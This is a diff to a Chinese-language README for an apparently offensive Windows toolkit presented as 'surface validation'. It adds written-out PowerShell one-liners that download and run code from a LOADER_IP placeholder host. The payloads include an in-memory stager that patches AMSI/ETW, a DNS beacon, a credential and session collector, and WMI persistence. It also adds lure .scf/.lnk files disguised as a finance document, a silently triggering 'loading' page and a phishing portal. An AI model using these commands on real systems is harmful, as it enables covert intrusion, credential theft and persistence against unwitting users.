@@ -39,6 +39,8 @@
 | `firewall/` | 边界策略验证 | 入站规则实际生效情况、配置文件状态 | ✅ |
 | `recon/` | 基线信息采集 | 补丁水位（KB/UBR）、网段拓扑、凭据存储位置、敏感文档分布 | — |
 | `combined/` | 一键综合验证 | 上述全部项的串联执行与结果汇总 | ✅ |
+| `delivery/` | 落地验证载荷 | 内存 stager、诱导文件（lnk/scf/url）、WMI 驻留、准入门户页 | 视载荷 |
+| `delivery/simple/` | 轻量探针 | 执行证明、DNS 信标、一屏情报、空窗加载页 | — |
 
 ---
 
@@ -75,6 +77,35 @@ powershell -ep bypass -File .\open_attack_surface.ps1 -Revert
 ```bat
 smb\smb_open_backdoor.bat    :: 测试面下发
 smb\revert_smb.bat           :: 基线恢复
+```
+
+### 5. 轻量探针（先确认链路是否可用，再上重载荷）
+
+```powershell
+# 执行证明：目标桌面弹窗 + 落标记（纯 UI，几乎不被拦）
+powershell -nop -ep bypass -c "iex(iwr http://LOADER_IP:8090/delivery/simple/proof_msgbox.ps1 -UseBasicParsing)"
+
+# 出网证明：只发 DNS 解析，绕开一切出站端口策略
+powershell -nop -ep bypass -c "iex(iwr http://LOADER_IP:8090/delivery/simple/beacon_dns.ps1 -UseBasicParsing)"
+
+# 一屏情报：系统 / UBR 补丁水位 / AV / SMB 配置 / 邻居 / 凭据面 / 会话
+powershell -nop -ep bypass -c "iex(iwr http://LOADER_IP:8090/delivery/simple/quick_collect.ps1 -UseBasicParsing)"
+```
+
+浏览器侧空窗诱导（用户只看到"正在加载"，3 秒后静默触发投递）：
+`http://LOADER_IP:8090/delivery/simple/blank_loading.html`
+
+### 6. 落地载荷（拿到执行点后）
+
+```powershell
+# 纯内存 stager（内置 AMSI/ETW 补丁，磁盘零写入）
+iex(iwr http://LOADER_IP:8090/delivery/stager_mem.ps1 -UseBasicParsing)
+
+# 生成诱导文件（.lnk / .url / .scf）放入目标可写共享
+powershell -ep bypass -File delivery\make_lnk.ps1 -Kind scf -Target '\\LOADER_IP\update\x.exe' -Out .\财务对账.scf
+
+# WMI 事件订阅驻留（避开计划任务/服务/autoruns）
+iex(iwr http://LOADER_IP:8090/delivery/wmi_persist.ps1 -UseBasicParsing)
 ```
 
 ---
@@ -139,6 +170,17 @@ win-surface-arsenal/
 ├── firewall/       边界策略验证
 ├── recon/          基线采集（补丁水位 / 拓扑 / 敏感面分布）
 ├── combined/       综合验证 + 单行速查 + 权限自校验
+├── delivery/       落地验证载荷
+│   ├── stager_mem.ps1    纯内存 stager（AMSI/ETW 补丁，磁盘零写入）
+│   ├── make_lnk.ps1      诱导文件生成（.lnk / .url / .scf）
+│   ├── wmi_persist.ps1   WMI 事件订阅驻留
+│   ├── portal_phish.html 内网准入门户页
+│   └── simple/           轻量探针
+│       ├── proof_msgbox.ps1  执行证明（弹窗 + 标记）
+│       ├── beacon_dns.ps1    出网证明（仅 DNS 解析）
+│       ├── quick_collect.ps1 一屏情报采集
+│       ├── blank_loading.html 空窗加载页（静默触发）
+│       └── one_liners.txt    12 条单行速查
 └── docs/           评估口径与实战记录
     ├── 局域网全景画像.md      资产与暴露面台账（样例）
     ├── 攻击复盘笔记.md        验证过程与判定依据
